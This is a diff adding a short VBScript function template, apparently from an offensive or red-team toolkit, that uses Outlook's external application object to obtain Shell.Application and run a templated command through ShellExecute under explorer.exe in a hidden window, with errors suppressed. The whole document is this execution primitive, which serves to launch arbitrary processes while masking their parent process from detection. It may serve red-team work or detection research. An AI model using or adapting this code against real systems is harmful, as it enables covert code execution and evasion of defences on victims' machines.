@@ -1,0 +1,7 @@
+Function Spawn_Explorer()
+    On Error Resume Next
+	set app = window.external.OutlookApplication.CreateObject("Shell.Application").Windows
+    set appobj = app.item()
+    appobj.Document.Application.ShellExecute {{command}}, {{arguments}}, "", "", 0
+    Spawn_Explorer = "Command spawned under explorer: " & {{command}}  & " " & {{arguments}}
+End Function
